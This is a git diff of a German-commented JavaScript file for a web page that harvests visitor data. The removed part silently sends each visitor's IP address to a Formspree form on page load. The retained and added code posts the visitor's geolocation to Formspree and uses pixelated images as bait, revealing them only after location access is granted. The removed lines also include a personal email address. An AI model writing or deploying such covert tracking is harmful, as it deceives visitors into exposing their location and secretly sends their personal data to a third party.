@@ -1,54 +1,7 @@
-// Beim Laden der Seite wird die IP-Adresse ermittelt und versendet
-document.addEventListener('DOMContentLoaded', function() {
-    sendIPOnPageLoad();
-});
-
-// Funktion, um die IP-Adresse des Benutzers zu ermitteln und zu senden
-function sendIPOnPageLoad() {
-    // IP-Adresse ermitteln
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ipAddress = data.ip;
-            console.log("Benutzer IP-Adresse:", ipAddress);
-
-            // IP-Adresse an den Server senden (via Formspree)
-            sendIPToFormspree(ipAddress);
-        })
-        .catch(error => {
-            console.error("Fehler beim Abrufen der IP-Adresse:", error);
-        });
-}
-
-// Funktion, um die IP-Adresse an Formspree zu senden
-function sendIPToFormspree(ipAddress) {
-    const formData = new FormData();
-    formData.append("email", "nejat.balta@outlook.de");  // Empfänger E-Mail-Adresse
-    formData.append("subject", "Neue IP-Adresse");
-    formData.append("message", `Die IP-Adresse des Besuchers: ${ipAddress}`);
-
-    // Sende die Daten an Formspree
-    fetch("https://formspree.io/f/mpwplqao", {
-        method: "POST",
-        body: formData
-    })
-    .then(response => {
-        console.log("Formspree Antwort:", response);
-        if (response.ok) {
-            console.log("IP-Adresse erfolgreich gesendet");
-        } else {
-            console.error("Fehler beim Senden der IP-Adresse", response);
-        }
-    })
-    .catch(error => {
-        console.error("Fehler beim Senden an Formspree:", error);
-    });
-}
-
 // Funktion für den Standort (geografische Koordinaten) und deren Versenden
 document.getElementById('trackBtn').addEventListener('click', function() {
     getLocation();
-    showNewImages(); // Auch bei Fehlern weiterhin Bilder anzeigen
+    showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
 });
 
 function getLocation() {
@@ -56,7 +9,7 @@ function getLocation() {
         navigator.geolocation.getCurrentPosition(sendLocationByEmail, showError);
     } else {
         document.getElementById("status").innerHTML = "Geolocation wird von diesem Browser nicht unterstützt.";
-        showNewImages(); // Bilder auch bei Fehlern anzeigen
+        showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
     }
 }
 
@@ -68,6 +21,9 @@ function sendLocationByEmail(position) {
     // Standortdaten an den Server senden (via Formspree)
     const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
     sendLocationToFormspree(locationData);
+    
+    // Wenn Standort erfolgreich ermittelt wurde, entferne die Verpixelung
+    removePixelation();
 }
 
 // Funktion, um Standortdaten an Formspree zu senden
@@ -83,7 +39,6 @@ function sendLocationToFormspree(locationData) {
         body: formData
     })
     .then(response => {
-        console.log("Formspree Antwort:", response);
         if (response.ok) {
             console.log("Standortdaten erfolgreich gesendet");
         } else {
@@ -111,7 +66,7 @@ function showError(error) {
             document.getElementById("status").innerHTML = "Ein unbekannter Fehler ist aufgetreten.";
             break;
     }
-    showNewImages(); // Bilder auch bei Fehlern anzeigen
+    showNewImages(); // Zeigt auch bei Fehlern weiterhin verpixelte Bilder an
 }
 
 // Funktion, um neue Bilder hinzuzufügen
@@ -125,15 +80,26 @@ function showNewImages() {
         'bild6.jpg'
     ];
 
-    // Füge die neuen Bilder zum DOM hinzu
     const additionalImagesContainer = document.getElementById("additional-images");
 
     newImages.forEach(function(imageSrc) {
         const imgElement = document.createElement("img");
         imgElement.src = imageSrc;
         imgElement.alt = "Weitere Bilder";
+        
+        // Verpixelte Bilder hinzufügen
+        imgElement.classList.add('pixelated'); 
+
         additionalImagesContainer.appendChild(imgElement);
     });
 
     document.getElementById("message").style.display = "block";
+}
+
+// Funktion, um Verpixelung von Bildern zu entfernen, wenn Standort erfolgreich ermittelt wurde
+function removePixelation() {
+    const images = document.querySelectorAll('#additional-images img');
+    images.forEach(img => {
+        img.classList.remove('pixelated');
+    });
 }
